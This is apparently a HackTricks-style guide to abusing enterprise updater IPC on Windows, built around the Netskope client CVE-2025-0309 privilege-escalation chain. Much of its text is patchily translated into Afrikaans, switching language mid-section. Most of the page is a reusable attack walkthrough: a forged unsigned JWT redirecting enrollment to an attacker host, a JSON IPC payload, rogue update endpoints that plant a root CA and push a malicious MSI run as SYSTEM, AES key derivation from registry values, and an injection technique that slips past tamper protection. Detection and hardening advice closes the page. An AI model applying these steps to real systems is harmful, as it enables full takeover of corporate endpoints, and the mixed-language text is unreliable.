# Abusing Enterprise Auto-Updaters and Privileged IPC (e.g., Netskope stAgentSvc)

{{#include ../../banners/hacktricks-training.md}}

This page generalizes a class of Windows local privilege escalation chains found in enterprise endpoint agents and updaters that expose a low‑friction IPC surface and a privileged update flow. A representative example is Netskope Client for Windows < R129 (CVE-2025-0309), where a low‑privileged user can coerce enrollment into an attacker‑controlled server and then deliver a malicious MSI that the SYSTEM service installs.

Key ideas you can reuse against similar products:
- Misbruik ’n bevoorregte diens se localhost IPC om herinskrywing of herkonfigurasie na ’n aanvallerserwer af te dwing.
- Implementeer die verskaffer se update-endpoints, lewer ’n kwaadwillige Trusted Root CA, en verwys die updater na ’n kwaadwillige, “signed” pakket.
- Ontduik swak signer‑kontroles (CN allow‑lists), opsionele digest‑vlagte, en slordige MSI‑eienskappe.
- As IPC “encrypted” is, lei die key/IV af vanaf algemeen leesbare masjienidentifikasies wat in die registry gestoor word.
- As die diens bellers beperk op grond van image path/process name, injekteer in ’n allow‑listed proses of spawn een suspended en bootstrap jou DLL via ’n minimale thread‑context patch.

---
## 1) Forcing enrollment to an attacker server via localhost IPC

Many agents ship a user‑mode UI process that talks to a SYSTEM service over localhost TCP using JSON.

Observed in Netskope:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Exploit flow:
1) Craft a JWT enrollment token whose claims control the backend host (e.g., AddonUrl). Use alg=None so no signature is required.
2) Send the IPC message invoking the provisioning command with your JWT and tenant name:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) Die diens begin jou kwaadwillige bediener vir enrollment/config te tref, byvoorbeeld:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Aantekeninge:
- Indien caller-verifikasie pad/naam-gebaseer is, laat die versoek afkomstig wees van 'n op die witlys geplaatste vendor binary (sien §4).

---
## 2) Oorname van die update-kanaal om kode as SYSTEM uit te voer

Sodra die kliënt met jou bediener praat, implementeer die verwagte endpoints en stuur dit na 'n aanvaller-MSI. Tipiese volgorde:

1) /v2/config/org/clientconfig → Gee 'n JSON-config terug met 'n baie kort opdateringsinterval, bv.:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Return a PEM CA certificate. The service installs it into the Local Machine Trusted Root store.
3) /v2/checkupdate → Supply metadata pointing to a malicious MSI and a fake version.

Bypassing common checks seen in the wild:
- Signer CN allow‑list: die diens mag slegs kyk of die Subject CN gelyk is aan “netSkope Inc” of “Netskope, Inc.”. Jou slegte CA kan ’n leaf uitreik met daardie CN en die MSI teken.
- CERT_DIGEST property: sluit ’n onskadelike MSI‑eienskap genaamd CERT_DIGEST in. Geen afdwinging tydens installasie nie.
- Optional digest enforcement: config‑vlag (bv. check_msi_digest=false) deaktiveer ekstra kriptografiese verifikasie.

Result: the SYSTEM service installs your MSI from
C:\ProgramData\Netskope\stAgent\data\*.msi
executing arbitrary code as NT AUTHORITY\SYSTEM.

---
## 3) Forging encrypted IPC requests (when present)

From R127, Netskope wrapped IPC JSON in an encryptData field that looks like Base64. Reversing showed AES with key/IV derived from registry values readable by any user:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Aanvallers kan die enkripsie reproduceer en geldige enkripteerde opdragte stuur vanaf ’n standaard gebruiker. Algemene wenk: as ’n agent skielik sy IPC “enkripteer”, kyk vir device IDs, product GUIDs, install IDs onder HKLM as materiaal.

---
## 4) Bypassing IPC caller allow‑lists (path/name checks)

Sommige dienste probeer die peer verifieer deur die TCP‑verbinding se PID op te los en die image path/name te vergelyk met allow‑listed vendor binaries onder Program Files (bv. stagentui.exe, bwansvc.exe, epdlp.exe).

Twee praktiese omseilings:
- DLL injection in ’n allow‑listed proses (bv. nsdiag.exe) en proxy IPC van binne daardie proses.
- Spawn ’n allow‑listed binary in suspended state en bootstrap jou proxy DLL sonder CreateRemoteThread (sien §5) om driver‑afgedwonge tamper‑reëls te bevredig.

---
## 5) Tamper‑protection friendly injection: suspended process + NtContinue patch

Produkte verskaf dikwels ’n minifilter/OB callbacks driver (bv. Stadrv) om gevaarlike regte van handles na beskermde prosesse te verwyder:
- Process: verwyder PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: beperk tot THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

’n Betroubare user‑mode loader wat aan hierdie beperkings voldoen:
1) CreateProcess van ’n vendor binary met CREATE_SUSPENDED.
2) Verkry handle waarvoor jy nog toegelaat is: PROCESS_VM_WRITE | PROCESS_VM_OPERATION op die proses, en ’n thread handle met THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (of net THREAD_RESUME as jy kode by ’n bekende RIP patch).
3) Oorskryf ntdll!NtContinue (of ander vroeë, gewaarborgde‑gemap thunk) met ’n klein stub wat LoadLibraryW op jou DLL‑pad aanroep, en dan terug spring.
4) ResumeThread om jou stub in‑process te trigger en jou DLL te laai.

Omdat jy nooit PROCESS_CREATE_THREAD of PROCESS_SUSPEND_RESUME op ’n reeds‑beskermde proses gebruik het nie (jy het dit geskep), word die driver se beleid bevredig.

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) outomatiseer ’n rogue CA, kwaadwillige MSI‑handtekening, en bedien die nodige endpoints: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.
- UpSkope is ’n custom IPC client wat arbitrêre (opsioneel AES‑enkripteerde) IPC‑boodskappe saamstel en die suspended‑process injection insluit sodat dit van ’n allow‑listed binary afkomstig lyk.

---
## 7) Detection opportunities (blue team)
- Monitor additions to Local Machine Trusted Root. Sysmon + registry‑mod eventing (see SpecterOps guidance) works well.
- Flag MSI executions initiated by the agent’s service from paths like C:\ProgramData\<vendor>\<agent>\data\*.msi.
- Review agent logs for unexpected enrollment hosts/tenants, e.g.: C:\ProgramData\netskope\stagent\logs\nsdebuglog.log – look for addonUrl / tenant anomalies and provisioning msg 148.
- Alert on localhost IPC clients that are not the expected signed binaries, or that originate from unusual child process trees.

---
## Hardening tips for vendors
- Bind enrollment/update hosts to a strict allow‑list; reject untrusted domains in clientcode.
- Authenticate IPC peers with OS primitives (ALPC security, named‑pipe SIDs) instead of image path/name checks.
- Keep secret material out of world‑readable HKLM; if IPC must be encrypted, derive keys from protected secrets or negotiate over authenticated channels.
- Treat the updater as a supply‑chain surface: require a full chain to a trusted CA you control, verify package signatures against pinned keys, and fail closed if validation is disabled in config.

## References
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)

{{#include ../../banners/hacktricks-training.md}}
